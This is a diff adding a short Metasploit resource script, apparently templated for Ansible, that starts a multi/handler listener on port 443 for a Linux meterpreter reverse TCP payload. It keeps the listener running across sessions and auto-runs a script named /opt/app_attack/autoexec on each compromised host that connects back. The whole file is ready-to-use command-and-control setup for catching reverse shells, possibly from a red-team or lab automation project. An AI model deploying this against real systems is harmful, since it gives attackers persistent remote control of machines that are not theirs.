@@ -1,0 +1,7 @@
+use exploit/multi/handler 
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST {{ ansible_default_ipv4.address }}
+set LPORT 443
+set ExitOnSession false
+set AutoRunScript multi_console_command -r /opt/app_attack/autoexec
+run
